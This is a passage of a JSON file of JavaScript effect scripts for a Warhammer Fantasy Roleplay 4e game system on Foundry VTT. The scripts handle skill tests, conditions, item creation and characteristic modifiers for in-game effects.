await loreTest.roll();\n\n  if (loreTest.succeeded) {\n    loreTest.result.other.push(`<b>${actor.name}</b> recognizes lure of the Leviathan.`);\n    loreTest.renderRollCard();\n    return;\n  } \n}\n\nlet test = await actor.setupSkill('Cool',  {\n  appendTitle: ` – ${this.effect.name}`,\n  skipTargets: true,\n  fields: {difficulty: 'easy'},\n  characteristic: 'wp',\n});\nawait test.roll();\n\nif (!test.succeeded) {\n  test.result.other.push(`<b>${actor.name}</b> became @Condition[Stunned] by the sight.`);\n  test.renderRollCard();\n  actor.addCondition(\"stunned\");\n}","6qUKKep5vhFYmo1J":"return args.type == \"channelling\" || args.skill?.name.includes(game.i18n.localize(\"NAME.Channelling\"))","6tjn0RH4VyOPFneS":"return [\"NAME.Row\", \"NAME.Swim\"].map(i => game.i18n.localize(i)).includes(args.skill?.name);","6ubojp9zwbfJnosT":"args.actor.system.details.move.value += 1;","6uldpFvKOCoW92cC":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.uqGxFOEqeurwkAO3\")\nitem = item.toObject()\n\nitem.system.specification.value = 10;\nitem.name += \" (Fire)\"\nfoundry.utils.setProperty(item, \"flags.wfrp4e.breath\",  \"fire\")\n\nItem.create(item, {parent : this.actor, fromEffect: this.effect.id})","6xTtJEhRc4OjcDTf":"if (getProperty(args.data, \"system.status.fortune.value\"))\n{\n\tthis.script.scriptNotification(\"Cannot update Fortune\");\n\tdelete args.data.system.status.wounds.value;\n}","715G1Bf0haOHvmYQ":"return !(args.skill?.name == game.i18n.localize(\"NAME.Bribery\") || args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\")))","71DmrxCTKGYL4Z7X":"return [\"fel\"].includes(args.characteristic)","7Ck0fkzE4WQ62qVe":"if (args.item.type  == \"skill\" && args.item.name == \"Melee (Basic)\")\n{\n     args.item.system.modifier.value += 20;\n}","7F3miqRA0ceMUBIu":"return args.characteristic != \"int\" || args.skill","7F6aGxZJjwxm5e5P":"if (args.test.result.castOutcome == \"failure\")\n{\n    ValueDialog.create(\"Enter Wounds Lost to gain SL\", this.effect.name, \"0\").then(async value => {\n        value = Math.clamped(value, 0, 3)\n        if (value == 0)\n        {\n            return;          \n        }\n        else if (Number.isNumeric(value))\n        {\n            this.script.scriptNotification(`Lost ${value} Wounds`)\n            this.actor.modifyWounds(-1 * value)\n            await this.item.system.toggleEquip();\n            args.test.addSL(value);\n            args.test.preData.other.push(`<strong>${this.effect.name}</strong>: +${value} SL`)\n        }\n    })\n}","7H6wYyJ6cpaoc2QQ":"return args.skill?.name == game.i18n.localize(\"NAME.Cool\");","7JW9t8AYSDkkzG2V":"// Apply changes when the mask is worn\n\nif (args.equipped) \n{  \n  this.actor.createEmbeddedDocuments(\"ActiveEffect\", [this.item.effects.contents[1]?.convertToApplied()])  \n  this.script.scriptMessage(`${this.actor.name} dons the <strong>${this.item.name}</strong>. <br>\n      If they wear the mask for more than an hour or benefit from any of its effects, they are exposed to @Corruption[moderate]{Moderate Corruption}. \n      `,\n      {whisper: ChatMessage.getWhisperRecipients(\"GM\")}) \n}\n\n// Notify of lingering effects when mask is removed\nelse if (!args.equipped)\n{\n    await this.item.effects.contents[0].delete();\n    await this.item.update({name : this.item.name += \" (Used)\"})\n    this.script.scriptMessage(`<strong>${this.item.name}</strong> on ${this.actor.name} has been taken off and loses its properties. However, the effects last for [[1d10+4]] days, after which they should be manually removed.`, \n    {whisper: ChatMessage.getWhisperRecipients(\"GM\")}\n    )\n    \n}","7OmrMjaU48o2FEZi":"\nthis.actor.characteristics.t.bonus = 10\n\nthis.actor.details.move.value = 0;\nthis.actor.details.move.walk= 0;\nthis.actor.details.move.run = 0;","7ScfB4o1QhXnNUfq":"return ![\"int\", \"wp\"].includes(args.characteristic)","7VAhXHov6pR1SkgD":"return args.item?.name == game.i18n.localize(\"NAME.Endurance\");","7WR2hJjHPhHhHxAq":"let poisoned = args.actor.hasCondition(\"poisoned\")\nif (poisoned)\n{\n   this.script.scriptNotification(`Removed ${poisoned.conditionValue} Poisoned Conditions`)\n   poisoned.delete();  \n}\nelse\n  this.script.scriptNotification(`No Poisoned Conditions`)","7ZoFUMDG2WJd8RMg":"this.script.scriptMessage(`Claimed <strong>${this.effect.name}</strong> Bonus`);","7e8FgQUF2oANANmx":"return args.skill?.name == \"Melee (Brawling)\" || args.item?.weaponGroup?.value == \"brawling\"","7f6OsttTzE7Hvzfk":"if (this.actor.statuses.has(\"infighting\")) // Only add +10 if already infighting\n    args.prefillModifiers.modifier += 10; \n\n\nargs.prefillModifiers.successBonus += 1; \n","7n3SEAGRA5ESK8gV":"args.options.disarm = true;","7szLG4VALuuy1cPm":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"easy\"}})\nawait test.roll();\nif (test.failed)\n{ \n  await this.actor.addCondition(\"fatigued\")\n} ","7w7QA7GBhzZ98OS0":"const sin = this.effect.sourceActor.system.status.sin.value;\nconst result = await WFRP_Tables.rollTable(\"manann-mood-made-meaningless\", sin);\nlet match = result.text.match(/b>([^<]+)/i);\nlet key = match[1];\nlet roll = new Roll(\"5d10\");\nlet value = undefined;\n\nawait this.script.scriptMessage(result.text, {flavor: result.title});\n\nswitch (key) {\n  case 'Stromfels Triumphant!':\n    value = 0;\n    break;\n  case 'Stromfels Ascends!':\n    await roll.evaluate();\n    if (this.actor.system.status.mood.value > 0)\n      value = -roll.total;\n    else if (this.actor.system.status.mood.value < 0)\n      value = roll.total;\n    break;\n  case 'No effect.':\n    break;\n  case 'Manann Provoked!':\n    await roll.evaluate();\n    value = -roll.total;\n    break;\n}\n\nif (roll._evaluated)\n  await roll.toMessage();\n\nawait this.effect.setFlag(\"wfrp4e-soc\", \"m4result\", {result: key, value});","7wBWUw05q0igh508":"// Imbibing this substance grants the user the Painless Creature Trait.\nconst hasPainless = this.actor.has(\"Painless\");\nif (hasPainless === undefined) \n{\n  let item = await fromUuid(\"Compendium.wfrp4e-core.items.wMwSRDmgiF2IdCJr\");\n  let data = item.toObject()\n  this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n  \n  this.script.scriptMessage(\n  `<p><strong>${this.actor.prototypeToken.name}</strong> has gained the Painless Creature Trait. This\n    effect lasts for one hour, after which it dissipates and the full effect\n    of all the imbiber's wounds come crashing down at once.</p>\n    <p>Note that this does not prevent the user from acquiring a Critical\n    Wound or dying from one. It merely allows them to ignore most\n    of their effects.</p>`, \n    { whisper: ChatMessage.getWhisperRecipients(\"GM\"), blind: true})\n}","84IB8CWa55XzoAkv":"return ([\"Animal Care\", \"Charm Animal\"].includes(args.item?.name) || args.item?.name.includes(\"Ride\") || args.item?.name.includes(\"Animal Training\"))","86ivOsBQAuu0UmFg":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"hard\"}, appendTitle : ` - ${this.effect.name}`, skipTargets: true});\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"poisoned\");\n}","87rrZ3ojHrXa3lCn":"this.actor.modifyWounds(1)","8AoA4bnstBtglRGZ":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.wMwSRDmgiF2IdCJr\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","8ByuHnUZ4RNTdGVv":"let strLoss = Math.ceil(CONFIG.Dice.randomUniform() * 10)\nlet tghLoss = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n\nif (!this.actor.has(\"Undead\") && !this.actor.has(\"Daemonic\")) \n{\n    this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), { appendTitle: \" - \" + this.effect.name, fields: { difficulty: \"average\" }, context: { failure: `Lost ${strLoss} Strength and ${tghLoss} Toughness` } }).then(async test => {\n        await test.roll();\n        if (test.failed) {\n            this.actor.update({ \"system.characteristics.s.initial\": this.actor.system.characteristics.s.initial - strLoss, \"system.characteristics.t.initial\": this.actor.system.characteristics.t.initial - tghLoss })\n        }\n    })\n\n}\nelse {\n    this.script.scriptNotification(`<strong>${this.actor.name}</strong> is immune to ${this.effect.name}`)\n}\n","8GyJgdHVBaLrHCY8":"let type = this.item.getFlag(\"wfrp4e\", \"breath\")\nlet types = {\n    none : \"None\",\n    cold : \"Cold\",\n    corrosion : \"Corrosion\",\n    fire : \"Fire\",\n    electricity : \"Electricity\",\n    poison : \"Poison\",\n    smoke : \"Smoke\",\n    various : \"Various\"\n}\nif (!type)\n{\n    type = (await ItemDialog.create(ItemDialog.objectToArray(types, this.item.img), 1, \"Choose Breath\"))[0]?.id;\n    this.item.updateSource({\"flags.wfrp4e.breath\" : type})\n}\n\nif (!this.item.name.includes(\"(\") && types[type] && type != \"none\")\n{\n    this.item.updateSource({name : this.item.name += ` (${types[type]})`, \"system.specification.value\" : this.item.system.specification.value.replace(\"(Type)\", \"\").trim()})\n}","8K9tpCwvFC9INk5V":"if ([\"t\", \"wp\"].includes(args.characteristic))\n{\n\targs.fields.modifier += 10;\n}\nelse if ([\"ag\", \"i\", \"int\"].includes(args.characteristic))\n{\n\targs.fields.modifier -= 10;\n}","8LmUVQxOwTLSeabg":"return args.data.targets.length > 0 || !args.weapon?.system.qualities.value.find(i => i.name == \"shield\") // Should count even if they don't have the skill","8N3Uqjq1ZxPxo4pk":"return !args.skill?.name?.includes(game.i18n.localize(\"NAME.Lore\"))","8RNziYGGb4sp3BGQ":"if (!args.test.weapon?.name.includes(\"Drakefire\"))\n{\n    args.test.result.misfire = game.i18n.localize(\"Misfire\");\n    args.test.result.misfireDamage = (0, eval)(parseInt(args.test.result.roll.toString().split('').pop()) + args.test.weapon.system.Damage);\n}","8ShLVT0bK1eQpinj":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.k00PimCWkff11IA0\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data])","8TRiAJ8thIKE4IoL":"\nlet SL = Number(getProperty(this.item, \"flags.wfrp4e.sourceTest.result.SL\") || 1)\n\nargs.actor.characteristics.i.modifier += 10 * SL\nargs.actor.characteristics.ag.modifier += 10 * SL","8ThudCYRqkjQIwJH":"if (args.opposedTest.attackerTest.result.critical)\n{\n   args.actor.addCondition(\"ablaze\")\n}","8WJsecxdndaHRxxS":"this.actor.status.addArmour(this.actor.characteristics.wp.bonus, {source: this.effect, magical : true})","8WeYU5e5LN9UeWFs":"if (args.item.type == \"spell\")\n{\n   let range = parseInt(args.item.Range)\n   if (Number.isNumeric(range))\n   {\n          args.item.system.range.value = \"2 * \" + args.item.system.range.value\n   }\n}","8ZAUBSH9CM9OTpTL":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Perception\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"easy\"}});\nawait test.roll();\n\nif (test.succeeded)\n{\n    this.actor.addCondition(\"stunned\")   \n}\nelse if (test.failed)\n{\n    this.actor.addCondition(\"poisoned\", 2);\n}","8araLuwmBq8GKEw3":"let APIgnored = args.AP.layers.reduce((prev, current) => prev + ((current.weakpoints && !current.ignored) ? current.value : 0), 0)\n\nif (APIgnored)\n{\n    args.modifiers.ap.ignored += APIgnored\n    args.modifiers.ap.details.push(`<strong>${this.effect.name}</strong>: Ignore AP with Weakpoints (${APIgnored})`)\n}","8fefDfiYKFOWdPER":"args.update({texture : {scaleX : 2, scaleY: 2, src: \"modules/wfrp4e-core/tokens/popout/gor.webp\"}});","8g2iitsgaJarKQpr":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.V0c3qBU1CMm8bmsW\")\nlet data = item.toObject()\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n","8gCja0mfKt4nYVZc":"args.fields.slBonus += 2 ","8hIyWDyfbgGAig65":"return [\"ws\", \"bs\", \"s\", \"t\", \"ag\", \"dex\"].includes(args.characteristic)","8jvEVPUCg3rKG48Y":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.9fq6p9Q6H02LjaSi\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","8noxHUQKR55Kx1YN":"this.actor.system.status.corruption.max += 1","8oE0DTzz0krOfFlV":"args.item.system.qualities.value.push({name : \"magical\"})\nargs.item.system.qualities.value.push({name : \"impact\"})\n","8rq4GL5d5nCn4kO7":"let caster = this.effect.sourceActor\nif (caster)\n{\n    let healed= caster.characteristics.wp.bonus\n    this.actor.modifyWounds(healed);\n    this.script.scriptMessage(`<strong>${this.actor.prototypeToken.name}</strong> regains ${healed} Wounds`)\n}","8tyMXDfHR8AJBdDu":"let weakpointsAP = args.AP.layers.filter(i => !i.ignored && i.weakpoints).reduce((ap, layer) => ap + layer.value, 0);\n\nif (weakpointsAP > 0)\n{\n    args.modifiers.ap.ignored += weakpointsAP;\n    args.modifiers.ap.details.push(`${this.effect.name} - Ignore Weakpoints (${weakpointsAP})`);\n}","8vpAtJ93GIeye1qj":"return args.type == \"cast\"","8wG9l4T9fc1bM0TN":"let item = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.kJNAY1YRaCy9IgmT\")).toObject();\nitem.system.specification.value = 1;\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","8xqYrBIf1Zhlwizg":"const repaired_message = `<p>Finished raisint <em>the anchor</em>.</p>`;\nconst test = 'Strength';\nconst difficulty = 'vhard';\nconst target = 20;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","8yBr6VbdKcrWUuqw":"this.actor.characteristics.i.value= \"-\"\nthis.actor.characteristics.int.value= \"-\"\nthis.actor.characteristics.wp.value= \"-\"\nthis.actor.characteristics.fel.value = \"-\"","8zTkDVziBPaNbMQX":"let filters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"petty\"\n    }\n]\n\nlet petty = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 6, \"Choose 6 Petty Spells\")\n\n\nfilters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"\"\n    }\n]\n\nlet arcane = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 9, \"Choose 9 Arcane Spells\")\n\nlet items = petty.concat(arcane).map(i => i.toObject())\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);","91S2GnBFYFbxmOCK":"this.actor.characteristics.s.bonus += 1\nthis.actor.characteristics.s.calculationBonusModifier -= 1","93K85NnVwjVNXlZq":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Trade\"));","956dUb5sd6OtbWZR":"args.fields.successBonus++;","96Y1yIH1lRjTs5hL":"if (args.test.succeeded)\n    return\n\nif (args.test.characteristicKey == \"wp\")\n     this.actor.addCondition(\"broken\")","98nKfcimlaPeM9h5":"await this.actor.addCondition(\"bleeding\")\nawait this.script.scriptMessage(await this.actor.applyBasicDamage(10, {suppressMsg : true}));","9A7rYY3FKi5XLihG":"fromUuid(\"Compendium.wfrp4e-core.items.5QcrpLQWWrsbKR79\").then(item => {\n     let data = item.toObject();\n     data.system.tests.value = data.system.tests.value.replace(\"coins\", \"metal objects\");\n     data.system.description.value += \"<p>This Talent also extends to any metal object because of <strong>Metallic Affinity</strong></p>\"\n     this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n})","9EVj4bmZJex45Mt7":"return args.skill?.name != game.i18n.localize(\"NAME.Athletics\");","9HWEDsnNxSykqbF5":"args.actor.system.details.move.value += 3;\nargs.actor.system.status.carries.max = Math.floor(args.actor.system.status.carries.max * 0.25);\nargs.actor.system.details.price.gc *= 1.1;","9JnPK1jNUEso7Pv8":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.9h82z72XGo9tfgQS\")\nlet data = item.toObject();\ndata.name += ` (Smell)`\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","9MDi3ok9gPwtbALf":"args.actor.details.move.value /= 2","9MwRUzRinhq1IjhG":"args.actor.addCondition(\"grappling\");","9RFoasDcFnYZ1txR":"return args.skill?.name == game.i18n.localize(\"NAME.Perception\");","9VfeubiCV83LN9iY":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.AtpAudHA4ybXVlWM\")\nlet data = item.toObject();\ndata.name += ` (When Charging)`\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","9WZa63lr0K3SsP4G":"let sourceItem = this.effect.sourceItem;\n\nif (sourceItem)\n{\n\tthis.actor.applyEffect({effectUuids : [sourceItem.effects.contents[2].uuid]})\n\tthis.script.scriptNotification(\"Applied after effects\");\n}","9Yn9uViEjcuaESJ2":"if (this.item.getFlag(\"wfrp4e\", \"failedCool\"))\n{\n    this.item.name += \" (No AP)\"\n    this.item.system.AP = {\n        \"head\": 0,\n        \"lArm\": 0,\n        \"rArm\": 0,\n        \"lLeg\": 0,\n        \"rLeg\": 0,\n        \"body\": 0\n      }\n}","9ZFPDCk8M2TQxh7x":"args.fields.modifier += 20\n","9bJGJrLqslV5lBya":" return args.characteristic == \"bs\"","9eWR4mdaoCSQawDT":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.GlShFJF2TpsNh1FX\");\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n","9fK07tqqZyPg7dpx":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty: \"veasy\"}})\nawait test.roll();\nif (test.failed)\n{\n      this.script.scriptNotification(\"Gained a <strong>Festering Wound</strong>\")\n      let item = await fromUuid(\"Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb\")\n      this.actor.createEmbeddedDocuments(\"Item\", [item.toObject()])\n}\nelse \n{\n    this.script.scriptNotification(\"Avoided a <strong>Festering Wound</strong>\")\n}\n","9nroaZDkW3WXNkB7":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.4MJJCiOKPkBByYwW\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id})","9ob2lPnk3PDot9Tx":"this.actor.addCondition(\"blinded\", this.effect.sourceTest.result.SL)","9qWUuEF8F5nehF1y":"args.item.system.qualities.value = args.item.system.qualities.value.concat([{name : \"magical\"}, {name : \"unbreakable\"}])\nargs.item.system.damage.value += ` + ${this.effect.sourceActor.system.characteristics.wp.bonus}`","A0OK0qAMmnf8iNJf":"if (args.test.result.SL < 0)\n{\n    this.script.scriptMessage(`Gained ${Math.abs(args.test.result.SL)} Corruption points`, {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n    if (args.test.failed && this.actor.type == \"character\")\n    {\n        this.actor.update({\"system.status.corruption.value\" : parseInt(this.actor.status.corruption.value) + Math.abs(args.test.result.SL)})\n    }\n}","A1odAcuRbq9797ZB":"let choice1 = [\n    {\n        type : \"skill\",\n        name : \"Melee (Basic)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 10\n                }\n            }\n        }\n    }\n]\nlet choice2 = [\n    {\n        type : \"skill\",\n        name : \"Melee (Polearm)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 10\n                }\n            }\n        }\n    }\n]\n\nlet choice = await Dialog.wait({\n    title : \"Choice\",\n    content : \n    `<p>\n    Select your choice\n    </p>\n    <ol>\n    <li>Melee (Basic)</li>\n    <li>Melee (Polearm)</li>\n    </ol> \n    `,\n    buttons : {\n        1 : {\n            label : \"Basic\",\n            callback : () => {\n                return choice1;\n            }\n        },\n        2 : {\n            label : \"Polearm\",\n            callback : () => {\n                return choice2;\n            }\n        }\n    }\n})\n\nlet updateObj = this.actor.toObject();\nlet items = []\nfor (let c of choice)\n{\n    let existing \n    if (c.type == \"skill\")\n    {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type)\n        if (existing && c.diff?.system?.advances?.value)\n        {\n            existing.system.advances.value += c.diff.system.advances.value\n        }\n    }\n\n    if (!existing)\n    {\n        let item = await game.wfrp4e.utility.find(c.name, c.type)\n        if (item)\n        {\n            item = item.toObject()\n            equip(item);\n                items.push(foundry.utils.mergeObject(item, (c.diff || {})))\n        }\n        else\n            ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n\n}\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","A3MW0UksYrHGa0Qw":"return [\"fel\", \"wp\", \"int\", \"t\"].includes(args.characteristic);","A3fvV69RS1lYgma0":"if (this.actor.type == \"character\")  \n  this.actor.corruptionDialog(\"minor\")\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name})\nawait test.roll();\nif(test.failed)\n{\n    await this.actor.addCondition(\"unconscious\");\n    let secondTest = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields : {difficulty : \"easy\"}, skipTargets: true, appendTitle :  \" - Despair\"})\n    await secondTest.roll();\n    if(secondTest.failed)\n    {\n         await this.actor.addCondition(\"fatigued\");\n    }\n}","A6DcKPzAGntzSCil":"let roll = await new Roll(\"1d10\").roll()\n\nroll.toMessage(this.script.getChatData({flavor : `${this.effect.name} (Duration)`}));\n\nthis.effect.updateSource({\"duration.rounds\" : roll.total})","ACgKpKrEEHoNGG0h":"return !args.skill?.name.includes(\"Channelling\") && args.type != \"channelling\"","ACtDCTLZXmd5uXjX":"let halve;\nif (args.opposedTest.attackerTest.item?.type != \"spell\")\n{\n    halve = await Dialog.confirm({title : this.effect.name, content : \"Halve Damage? (Halves all damage other than fire, cold, and magic)\"})\n}\nelse\n{\n    halve = false;\n}\n\nif (halve)\n{\n    args.totalWoundLoss /= 2;\n    args.modifiers.other.push({label : this.effect.name, details : \"Halved\", value : \"× 0.5\"})\n}","AFiB20FaOBmBv2Kz":"if (args.actorsystem.details.move.sail.value > 0)\n  args.actor.system.details.move.sail.value = Math.floor(args.actor.system.details.move.sail.value * .5);\n","AGD7zCyV4zruvnWu":"return args.type != \"cast\" || ![\"death\", \"necromancy\", \"life\", \"light\", \"heavens\"].includes(args.spell?.system.lore.value)","AHZ8f7dfN8jNsYk6":"let token = this.actor.getActiveTokens()[0];\nlet target = args.data.targets[0];\nlet weapon = args.weapon;\n\nif(!target || !token)\n{\n    return;\n}\n\nlet distance = canvas.grid.measureDistances([{ ray: new Ray({ x: token.center.x, y: token.center.y }, { x: target.center.x, y: target.center.y }) }], { gridSpaces: true })[0]\nlet currentBand\n\nfor (let band in weapon.range.bands) \n{\n  if (distance >= weapon.range.bands[band].range[0] && distance <= weapon.range.bands[band].range[1]) \n  {\n    currentBand = band;\n    break;\n  }\n}\n\nreturn [game.i18n.localize(\"Long Range\"), game.i18n.localize(\"Extreme\")].includes(currentBand)","AI6bFrjWk4NH9FBd":"this.actor.addCondition(\"entangled\", this.effect.sourceTest.result.overcast.usage.other.current)","ALuPRzf85dmkEfLo":"return args.skill?.name == game.i18n.localize(\"NAME.Intuition\");","AMI2wDJqsIZsoq1e":"if (args.opposedTest.result.differenceSL >= 0 && args.opposedTest.result.differenceSL <= 2 && args.opposedTest.result.winner == \"attacker\")\n{ \n    this.script.scriptMessage(`Emits a cloud of foul-smelling blackpowder. Enable the <strong>Fellowship Penalty</strong> Active Effect on @UUID[${this.actor.uuid}].`, {blind : true, whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n}","AMxezwtYnWCF6Oza":"return args.skill?.name == \"Ranged (Blackpowder)\"","AS7CstSosuCrwZ19":"this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n      \"dim\": 20,\n      \"bright\": 10,\n      \"angle\": 360,\n      \"alpha\": 0.4,\n      \"animation\": {\n          \"speed\": 3,\n          \"intensity\": 3,\n          \"type\": \"torch\",\n      },\n      \"color\": \"#ffcc66\",\n  }}));","AV2Kj6jgmIc45zKi":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\"));","AVROqafFhKjN6TPR":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.DrNUTPeodEgpWTnT\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","AWgZnm9xLyIWCDnp":"let robust = args.modifiers.other.find(i => i.key == \"robust\")\nif (robust)\n{\n\trobust.value--;\n}\nelse \n{\n\targs.modifiers.other.push({key: \"robust\", label : this.effect.name, value : -1})\n}\n","AYEiCx2Es3QtMY28":"let choice1 = [\n    {\n        type: \"trait\",\n        name: \"Bestial\",\n    },\n    {\n        type: \"trait\",\n        name: \"Regeneration\",\n    },\n    {\n        type: \"trait\",\n        name: \"Size (Large)\",\n    },\n    {\n        type: \"trait\",\n        name: \"Territorial\",\n    }\n]\n\nlet updateObj;\nlet actor;\n\nasync function addTrait(c) {\n    let items = [];\n    console.log(\"TEST1\", c);\n    let existing;\n    if (c.type == \"trait\") {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type);\n    }\n    console.log(\"TEST\", existing);\n    if (!existing) {\n        let item = await game.wfrp4e.utility.find(c.name, c.type);\n        if (item) {\n            item = item.toObject();\n            items.push(item);\n        }\n        else\n            ui.notifications.warn(`Could not find ${c}`, { permanent: true });\n    }\n    console.log(\"WISH LIST2\", choice1, items);\n    actor.createEmbeddedDocuments(\"Item\", items);\n}\n\nasync function dialogChoice() {\n    for (let c of choice1) {\n        await new Dialog({\n            title: \"Option\",\n            content:\n                `<p>\n            Add Option?\n            </p>\n            <ol>\n            <li>${c.name}</li>\n            </ol> \n            `,\n            buttons: {\n                1: {\n                    label: \"Yes\",\n                    callback: () => {\n                        addTrait(c)\n                        c.valid = true;\n                    }\n                },\n                2: {\n                    label: \"No\",\n                    callback: () => {\n                    }\n                }\n            }\n        }).render(true)\n    }\n}\n\nupdateObj = this.actor.toObject();\nactor = this.actor\nawait dialogChoice();\n\n","AZGXrZOQ4EzjxRL9":"return true;","AaPPmnv7AtxsRVUs":"args.actor.details.move.value = 1;","Adgs6Zs0FdefO6qx":"if (args.test.options.pilot && args.test.result.reversed)\n{\n\targs.test.data.result.SL = \"+\" + Math.min(1, Number(args.test.data.result.SL))\n\targs.test.result.other.push(`<b>${this.effect.name}</b>: SL limited to 1`)\n}","Ah2wyywkL8hjJNXM":"args.options.healWounds = true;","AjC4dsiuhVCOnRGI":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.MVI0lXcg6vvtooAF\")\nlet data = item.toObject();    \nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id});","AmOMCUaWLJ2iJAt5":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.IFKWu98qmWpaSfUi\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","AmpDbT0BkDHeaRzf":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.pTorrE0l3VybAbtn\");\nlet data = item.toObject();\ndata.system.specification.value = 1;\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","ApaLcUhuty3EzJoP":"let fortunePoints = this.effect.sourceTest.result.overcast.usage.other.current\nlet current = this.actor.status.fortune.value\n\nthis.actor.update({\"system.status.fortune.value\" : fortunePoints + current})\n\nthis.script.scriptMessage(`<b>${this.actor.prototypeToken.name}</b> fortune points increased from ${current} to ${fortunePoints + current}`)","AqHLHp4kH6KULk3e":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n    let effectData = this.item.effects.contents[0].convertToApplied();\n\teffectData.flags.wfrp4e.sourceItem = this.item.uuid\n\tactor.applyEffect({effectData : [effectData]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","AyNb5sj6FD2Z3Q5T":"this.actor.addCondition(\"dead\")\nthis.actor.setWounds(0);\nthis.script.scriptMessage(await game.wfrp4e.tables.formatChatRoll(\"scatter\"))","AyS3iLljxHRKsHg4":"let broken = this.actor.hasCondition(\"broken\");\nlet fatigued = this.actor.hasCondition(\"fatigued\");\nawait broken?.delete();\nawait fatigued?.delete()\nlet drilled = await fromUuid(\"Compendium.wfrp4e-core.items.Item.J9MK0AIaTbvd5oF6\")\nlet fearless = await fromUuid(\"Compendium.wfrp4e-core.items.Item.8pVzgPkgWpTJvfhG\")\nlet stout = await 